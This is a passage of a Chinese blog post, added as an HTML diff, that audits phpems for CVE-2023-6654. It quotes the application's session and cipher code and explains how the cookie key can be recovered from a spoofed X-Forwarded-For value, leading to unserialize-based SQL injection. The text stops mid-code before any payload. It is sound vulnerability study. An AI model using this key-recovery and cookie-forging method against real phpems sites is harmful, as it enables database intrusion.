@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="phpems 代码审计学习" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            phpems 代码审计学习
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93SQL%E6%B3%A8%E5%85%A5"><span class="post-toc-text">反序列化打SQL注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="post-toc-text">反序列化点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0%E7%A0%B4%E8%A7%A3"><span class="post-toc-text">加密函数破解</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sql注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="post-toc-text">漏洞利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RCE%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="post-toc-text">RCE（代码执行）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BA%E5%88%86%E7%B1%BB%E5%88%97%E8%A1%A8"><span class="post-toc-text">标签类型为分类列表</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BASQL%E6%A8%A1%E5%BC%8F"><span class="post-toc-text">标签类型为SQL模式</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BA%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F"><span class="post-toc-text">标签类型为模板模式</span></a></li></ol></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>php反序列化导致的sql注入</p>
+<p>西湖论剑赵总出的题，他提交的CVE-2023-6654</p>
+<p>参考文章:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA">https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA</a></p>
+</blockquote>
+<p>反序列化导致的sql注入我还是第一次见，学习</p>
+<p>路由分析就不写了，自己去看，着重在反序列化和sql注入部分</p>
+<h1 id="反序列化打SQL注入"><a href="#反序列化打SQL注入" class="headerlink" title="反序列化打SQL注入"></a>反序列化打SQL注入</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>首先通过调试会发现，每次访问都会执行新建<code>session</code>对象，并执行他的<code>getSessionId()</code>方法</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108558.png" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108558.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108178.png" title="image-20240202210853025" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108178.png" alt="image-20240202210853025"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSessionId</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;sessionid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cookie</span> = <span class="variable language_">$this</span>-&gt;strings-&gt;<span class="title function_ invoke__">decode</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">getCookie</span>(<span class="variable">$this</span>-&gt;sessionname));<span class="comment">//currentuser</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cookie</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;sessionid = <span class="variable">$cookie</span>[<span class="string">&#x27;sessionid&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;sessionid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_getOnlySessionid</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setSessionUser</span>(<span class="keyword">array</span>(<span class="string">&quot;sessionid&quot;</span> =&gt; <span class="variable">$this</span>-&gt;sessionid,<span class="string">&#x27;sessionip&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">getClientIp</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionValue</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setSessionUser</span>(<span class="keyword">array</span>(<span class="string">&quot;sessionid&quot;</span> =&gt; <span class="variable">$this</span>-&gt;sessionid,<span class="string">&#x27;sessionip&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">getClientIp</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sessionid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这里他会调用<code>strings::decode()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = CS;<span class="comment">//配置文件的密钥</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$kl</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$il</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$il</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$i</span>%<span class="variable">$kl</span>;</span><br><span class="line">        <span class="variable">$info</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$info</span>[<span class="variable">$i</span>])-<span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$p</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里进行了反序列化操作，也就是漏洞触发点</p>
+<p>这里传入的值就是<code>$this-&gt;ev-&gt;getCookie($this-&gt;sessionname)</code>返回的值，取的是cookie里<code>exam_currentuse</code>的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022111383.png" title="image-20240202211151241" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022111383.png" alt="image-20240202211151241"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022112220.png" title="image-20240202211226130" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022112220.png" alt="image-20240202211226130"></a></p>
+<p>所以这里的值就是可控的。从<code>decode()</code>可以知道，这个值是经过加密的，我们还需要将需要反序列化的值进行加密操作，再传进<code>decode()</code>进行反序列化</p>
+<h3 id="加密函数破解"><a href="#加密函数破解" class="headerlink" title="加密函数破解"></a>加密函数破解</h3><p>这里的CS的值为配置文件里定义，且我们不知道，所以我们要找方法获得这个key</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022117488.png" title="image-20240202211714349" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022117488.png" alt="image-20240202211714349"></a></p>
+<p>对比加密和解密函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$key</span> = CS;<span class="comment">//配置文件的密钥</span></span><br><span class="line">    <span class="variable">$kl</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$il</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$il</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$i</span>%<span class="variable">$kl</span>;</span><br><span class="line">        <span class="variable">$info</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$info</span>[<span class="variable">$i</span>])+<span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$p</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$info</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = CS;<span class="comment">//配置文件的密钥</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$kl</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$il</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$il</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$i</span>%<span class="variable">$kl</span>;</span><br><span class="line">        <span class="variable">$info</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$info</span>[<span class="variable">$i</span>])-<span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$p</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$key</code>的长度为32，<code>$p</code>的值就是<code>$i%$kl</code>，即取模操作，那么<code>$p</code>的值就为<code>0,1,2,xxx,xxx,xxx,31,0,1,2</code>依次循环，每次循环遍历了32次</p>
+<p>加解密的大致模式为：</p>
+<p>密文字符的ascii <strong>&#x3D;</strong> 明文字符的ascii <strong>+</strong> key字符的ascii，明文字符的ascii <strong>&#x3D;</strong> 密文字符的ascii <strong>-</strong> key字符的ascii</p>
+<p>可以推出：key字符的ascii <strong>&#x3D;</strong> 密文字符的ascii <strong>-</strong> 明文字符的ascii&#96;</p>
+<p>所以只要知道明文和对应的密文，就可以得到key，现在就是要找到可控的密文</p>
+<p>当我们不穿任何cookie进行访问的时候，他会调用这里来生成一个cookie</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022132502.png" title="image-20240202213214365" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022132502.png" alt="image-20240202213214365"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_getOnlySessionid</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">uniqid</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">getClientIp</span>().<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>).<span class="title function_ invoke__">microtime</span>()).<span class="title function_ invoke__">rand</span>(<span class="number">100000</span>,<span class="number">999999</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;sessionid = <span class="title function_ invoke__">md5</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionValue</span>(<span class="variable">$this</span>-&gt;sessionid))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_getOnlySessionid</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是取md5值，所以跟我们无关</p>
+<p>得看<code>$this-&gt;setSessionUser()</code>，跟进<code>$this-&gt;ev-&gt;getClientIp()</code>，可以知道<code>$this-&gt;e[&#39;ip&#39;]</code>的值是可以通过两个header控制的，比如<code>Client-IP</code>和<code>X-Forwarded-For</code>。并将返回值赋值给<code>sessionip</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClientIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;e[<span class="string">&#x27;ip&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>), <span class="string">&quot;unknown&quot;</span>))</span><br><span class="line">            <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>), <span class="string">&quot;unknown&quot;</span>))</span><br><span class="line">            <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>), <span class="string">&quot;unknown&quot;</span>))</span><br><span class="line">            <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="string">&quot;unknown&quot;</span>))</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;e[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;e[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后进入这个函数，来设置cookie</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置会话用户信息</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setSessionUser</span>(<span class="params"><span class="variable">$args</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$args</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$args</span>[<span class="string">&#x27;sessiontimelimit&#x27;</span>])<span class="variable">$args</span>[<span class="string">&#x27;sessiontimelimit&#x27;</span>] = TIME;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;sessionid)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionId</span>();</span><br><span class="line">        <span class="variable">$args</span>[<span class="string">&#x27;sessionid&#x27;</span>] = <span class="variable language_">$this</span>-&gt;sessionid;</span><br><span class="line">        <span class="variable">$args</span>[<span class="string">&#x27;sessiontimelimit&#x27;</span>] = TIME;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;session&#x27;</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;AND&#x27;</span>,<span class="string">&quot;sessionid = :sessionid&quot;</span>,<span class="string">&#x27;sessionid&#x27;</span>,<span class="variable language_">$this</span>-&gt;sessionid)));</span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;pdosql-&gt;<span class="title function_ invoke__">makeDelete</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;session&#x27;</span>,<span class="variable">$args</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;pdosql-&gt;<span class="title function_ invoke__">makeInsert</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$ck</span> = <span class="keyword">array</span>(<span class="string">&#x27;sessionid&#x27;</span>=&gt;<span class="variable 